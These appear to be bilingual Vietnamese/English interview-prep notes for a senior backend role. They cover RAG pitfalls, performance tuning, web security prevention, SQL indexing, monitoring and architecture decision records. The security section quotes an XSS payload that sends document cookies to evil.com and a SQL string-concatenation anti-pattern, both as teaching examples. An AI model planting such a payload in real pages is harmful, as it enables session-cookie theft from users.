T-04
RAG bottlenecks — vector retrieval inaccurate, too many docs = LLM "drafting". Solutions?
RAG limitations — "drafting" — giải pháp từng vấn đề
▾
Problem 1 — Low Precision
Vector miss exact terms
Vector retrieves semantically similar but misses exact names/IDs.

Fix: Hybrid Search (Qdrant + Elasticsearch BM25). +25% recall for proper nouns, order IDs.
Trade-off: 2 systems to maintain
Problem 2 — "Drafting"
Context overflow
K=20 chunks all score ~0.65 → LLM no clear signal → hallucinates.

Fix: Re-rank → keep top 4 only (score >0.7). Prompt: "Say I don't know if absent."
Trade-off: +80ms latency
Problem 3 — Hallucinations
LLM makes up info
LLM generates claims not in context.

Fix: Temperature=0.1 + force citations + groundedness check post-generation.
Trade-off: 1 extra LLM call
Problem 4 — SQL queries
RAG not always needed
"Total revenue last month?" is a SQL query, not a RAG use case.

Fix: Intent router — structured queries → SQL, unstructured → RAG.
Reduces latency & hallucination

T-06
How do you improve system performance? End-to-end approach.
Bạn cải thiện performance hệ thống như thế nào? Từ thiết kế đến database.
▾
💡 Chiến lược trả lời
Nói theo lớp (layer): đo → profiling → design → code → DB → cache → infra. Không nói vội "dùng Redis" ngay — phải đo trước mới biết bottleneck ở đâu.
STEP 1
ĐO TRƯỚC Không optimize mù. Dùng profiling tools:
— async-profiler / JProfiler → tìm CPU hot path
— Prometheus + Grafana → p50/p95/p99 latency per endpoint
— ELK Stack → slow query logs, error rate
— JMeter / k6 → load test để reproduce bottleneck dưới tải thực tế
Tại HSC: async-profiler xác định 3 hotspot — sync DB write, single-thread, zero cache.
STEP 2
DESIGN LEVEL Async vs Sync:
— Sync write → blocking thread → bottleneck tại scale. Solution: Kafka WAL (async persistence)
— CQRS pattern: tách read model vs write model → read path không contend với write path
— Event-driven: decouple services, buffer spike via Kafka partitions
— Circuit breaker (Resilience4j): fail fast thay vì chờ timeout → giảm cascade failure
STEP 3
DATABASE Query optimization:
— EXPLAIN ANALYZE trên mọi slow query trước khi optimize
— Index đúng chỗ: composite index cho WHERE + ORDER BY, covering index cho SELECT
— Tránh N+1 query: dùng JOIN hoặc batch fetch (IN clause)
— Partition table theo time range (ví dụ: trade_history_2024, 2025) → scan ít data hơn
— Read replica: đẩy read queries sang replica, write chỉ vào primary
— Connection pool (HikariCP): pool size = (CPU cores × 2) + spindle count
Tại HSC: Redis cache giảm 60% DB load, p99 từ 800ms → 280ms.
STEP 4
CACHE LAYER Cache strategy:
— Cache-aside (Lazy loading): check cache trước, miss → DB → populate cache
— Write-through: write to cache + DB đồng thời → consistent nhưng latency cao hơn
— TTL strategy: hot data short TTL, cold data long TTL
— Cache stampede prevention: probabilistic early expiration hoặc mutex lock khi re-populate
— Redis Cluster: sharding tự động, replica, failover tự động
STEP 5
CODE LEVEL Java/Spring optimizations:
— Virtual threads (Java 21): thay thread-per-request → millions of virtual threads, zero blocking waste
— Batch processing: JDBC batch insert thay vì individual inserts
— Lazy loading trong JPA: chỉ fetch association khi thực sự cần
— StringBuilder thay String concatenation trong loops
— CompletableFuture: parallel external calls thay vì sequential
STEP 6
INFRA LEVEL Infrastructure:
— KEDA autoscaling: scale consumers dựa vào Kafka lag metric, không chờ CPU threshold
— CDN: static assets + API response cache tại edge, giảm latency cho distributed users
— Load balancer: least-connection strategy thay round-robin cho uneven workloads
— GraalVM native image: startup time từ giây → milliseconds cho microservices
PERFORMANCE OPTIMIZATION LAYERS — Từ trên xuống dưới
T-07
Security — SQL Injection, XSS, CSRF, Auth vulnerabilities. How do you prevent them?
Security — SQL Injection, XSS, CSRF, Auth. Cách phòng chống từng loại.
▾
💡 Chiến lược trả lời
Nhóm theo OWASP Top 10. Với mỗi loại attack: (1) Cơ chế tấn công, (2) Prevention cụ thể, (3) Ví dụ thực tế trong code. Mention Defense in Depth.
SQL INJECTION Cơ chế: Attacker inject SQL vào input → execute arbitrary query.
Ví dụ xấu: "SELECT * FROM users WHERE id = " + userId

Prevention:
— Parameterized queries / Prepared Statements: NEVER string concat SQL
— JPA/Hibernate: dùng JPQL hoặc Criteria API thay native SQL khi có thể
— Input validation: whitelist allowed characters, reject suspicious patterns
— Least privilege DB user: app user chỉ có SELECT/INSERT/UPDATE cần thiết, không có DROP/ALTER
— WAF: Web Application Firewall lọc request ở edge
XSS
(Cross-Site
Scripting) Cơ chế: Inject malicious script vào page, execute trong browser của victim.
Ví dụ: <script>fetch('evil.com?c='+document.cookie)</script>

Prevention:
— Output encoding: encode HTML entities khi render user input
— Content Security Policy (CSP) header: block inline scripts
— HttpOnly cookies: JavaScript không đọc được session cookie
— React/Angular tự escape by default — tránh dangerouslySetInnerHTML
— DOMPurify library: sanitize HTML input trước khi render
CSRF
(Cross-Site
Request Forgery) Cơ chế: Attacker trick browser của victim gửi request đến server với cookie hợp lệ.

Prevention:
— CSRF token: server-generated token trong mỗi form, validate server-side
— SameSite cookie: SameSite=Strict hoặc Lax → browser không gửi cookie cross-site
— Double submit cookie pattern: token trong cookie + request header phải match
— Spring Security: tự động CSRF protection, chỉ cần enable
— CORS policy: chỉ allow trusted origins
AUTH
VULNERABILITIES Common issues & fixes:
— Broken Authentication: dùng OAuth2/OIDC (Keycloak) thay tự build auth từ đầu
— JWT security: verify signature, check expiry, use RS256 not HS256 để không share secret
— Token storage: httpOnly cookie > localStorage (XSS-safe)
— Rate limiting: limit login attempts, block brute force (Kong plugin hoặc custom)
— Password hashing: BCrypt với cost factor 12+, không MD5/SHA1
— MFA: TOTP (Google Authenticator) cho sensitive operations
DEFENSE
IN DEPTH Layered security approach:
— Layer 1 — Network: Firewall, WAF, DDoS protection (Cloudflare)
— Layer 2 — Gateway: Kong rate limiting, JWT validation, IP whitelist
— Layer 3 — Service Mesh: Istio mTLS cho service-to-service
— Layer 4 — Application: Input validation, parameterized queries, Spring Security
— Layer 5 — Data: Encryption at rest (AES-256), encryption in transit (TLS 1.3)
— Layer 6 — Monitoring: SIEM alerts, anomaly detection, audit logs
DEFENSE IN DEPTH — 6 Security Layers
T-08
SQL Index — How do they work? When to use which type? Common mistakes?
SQL Index — Cơ chế hoạt động, khi nào dùng loại nào, sai lầm phổ biến.
▾
CƠ CHẾ
B-TREE INDEX B-Tree là default index trong PostgreSQL/MySQL.
— Cấu trúc cây cân bằng: lookup = O(log n), không phải O(n) full scan
— Mỗi leaf node trỏ đến row trong table
— Hiệu quả với: =, <, >, BETWEEN, LIKE 'prefix%', ORDER BY
— Không hiệu quả: LIKE '%suffix', function(column) (function-based queries)
CÁC LOẠI
INDEX 1. Single column index:
CREATE INDEX idx_user_email ON users(email); Dùng cho WHERE email = ? — high cardinality column

2. Composite index (multi-column):
CREATE INDEX idx_orders_user_date ON orders(user_id, created_at); Quy tắc leftmost prefix: index trên (A,B,C) hỗ trợ query WHERE A, WHERE A+B, WHERE A+B+C — nhưng KHÔNG hỗ trợ WHERE B hay WHERE C alone

3. Covering index:
CREATE INDEX idx_cover ON orders(user_id) INCLUDE (status, amount); Query chỉ cần đọc index, không cần đọc table → Index-only scan, rất nhanh

4. Partial index:
CREATE INDEX idx_active_users ON users(email) WHERE active = true; Index chỉ subset of rows → nhỏ hơn nhiều, hiệu quả hơn cho filter thường gặp

5. Hash index: chỉ cho =, không cho range — ít dùng
6. GIN/GiST: full-text search, JSON, arrays trong PostgreSQL
SAI LẦM
PHỔ BIẾN ❌ Over-indexing:
— Mỗi index = overhead khi INSERT/UPDATE/DELETE (phải cập nhật index)
— Bảng write-heavy: quá nhiều index làm chậm write hơn lợi từ read

❌ Wrong column order trong composite index:
— Index (status, user_id) không hỗ trợ WHERE user_id = ? alone
— Rule: high-selectivity column (user_id) nên đứng trước low-selectivity (status)

❌ Function trên indexed column:
— WHERE YEAR(created_at) = 2024 → không dùng index → full scan!
— Fix: WHERE created_at BETWEEN '2024-01-01' AND '2024-12-31'

❌ Index trên low-cardinality column:
— Index trên boolean column (true/false) thường kém hiệu quả hơn full scan
— Rule: cardinality > 10% rows → index mới có ý nghĩa

❌ Implicit type conversion:
— WHERE phone_number = 0912345678 (int vs varchar) → index bị bỏ qua
EXPLAIN
ANALYZE Luôn EXPLAIN ANALYZE trước khi add index:
EXPLAIN ANALYZE SELECT * FROM orders WHERE user_id = 123 ORDER BY created_at DESC; Nhìn vào:
— Seq Scan → missing index
— Index Scan → good
— Index Only Scan → optimal (covering index)
— Bitmap Heap Scan → medium, nhiều rows match
— cost=X..Y: Y là total cost (lower is better)
B-TREE INDEX — Table scan vs Index scan
T-09
Monitoring & Observability — How do you monitor a production system?
Monitoring & Observability — 3 pillars: Metrics, Logs, Traces. Stack thực tế.
▾
3 PILLARS Observability = Metrics + Logs + Traces

① Metrics (What is happening?)
— Prometheus: scrape /actuator/prometheus endpoint từ mọi service
— Grafana: dashboard p50/p95/p99, error rate, throughput
— AlertManager: PagerDuty/Slack khi SLA breach
— Micrometer: Spring Boot auto-instruments HTTP, JVM, DB pool, cache

② Logs (Why did it happen?)
— ELK Stack: Elasticsearch + Logstash + Kibana
— Structured JSON logging với correlation ID (trace_id) trong mọi log line
— Log levels: DEBUG (dev only) → INFO (business events) → WARN (recoverable) → ERROR (alert)

③ Distributed Traces (Where did it happen?)
— Jaeger / Zipkin: trace request across services
— OpenTelemetry: vendor-neutral instrumentation — auto-inject trace_id
— Trace shows: service hops, latency per hop, DB queries, external calls
KEY METRICS
TO MONITOR The Four Golden Signals (Google SRE):

① Latency: p50/p95/p99 per endpoint — not just average!
— Average hides outliers. p99=2000ms means 1 in 100 users waits 2 seconds.

② Traffic: requests/second, Kafka consumer lag
— Consumer lag spike = signal of downstream bottleneck

③ Errors: error rate %, 5xx vs 4xx, exception types
— Alert threshold: >0.1% error rate for financial systems

④ Saturation: CPU%, memory%, DB connection pool usage, disk I/O
— HikariCP pool exhaustion = immediate alert (all threads waiting for DB connection)

Trade-off / Architecture Decision / Technical Leadership — Người có "voice" kỹ thuật
"Make architecture decisions with clear trade-offs", "Write ADRs", "Lead technical discussions"
+
💡 Insight từ JD: Doanh nghiệp tìm người có voice trong kỹ thuật — viết được tài liệu thiết kế, defend được lựa chọn, dẫn được technical discussion. Không phải người chờ task. ADR (Architecture Decision Record) là artifact thể hiện rõ nhất tư duy Senior.

ADR Format: (1) Context — tình huống hiện tại và vấn đề cần giải quyết. (2) Options considered — ít nhất 3 lựa chọn với pros/cons. (3) Decision — lựa chọn cuối cùng và lý do. (4) Consequences — trade-off đã chấp nhận, risks cần monitor. (5) Status — Proposed / Accepted / Superseded.

Trade-off muscle: Mọi quyết định kiến trúc đều có trade-off. Không có "best solution" — chỉ có "best fit cho context". Ví dụ: Microservices vs Monolith — tùy team size, deployment frequency, domain complexity.

Technical Leadership: Run effective RFC (Request for Comments) → gather feedback → synthesize → decide → document. Mentor junior qua code review — teach pattern, not just fix bug. Build team's technical intuition.

🇻🇳 "Mỗi quyết định kiến trúc tôi đều document bằng ADR — Context, Options với trade-off rõ ràng, Decision và Consequences. Ví dụ: tại HSC tôi quyết định giữ monolith cho core trading engine vì team 6 người, deployment frequency thấp. Sau 18 tháng mới extract thành microservices khi domain đủ clear. Không có silver bullet — chỉ có lựa chọn phù hợp context."
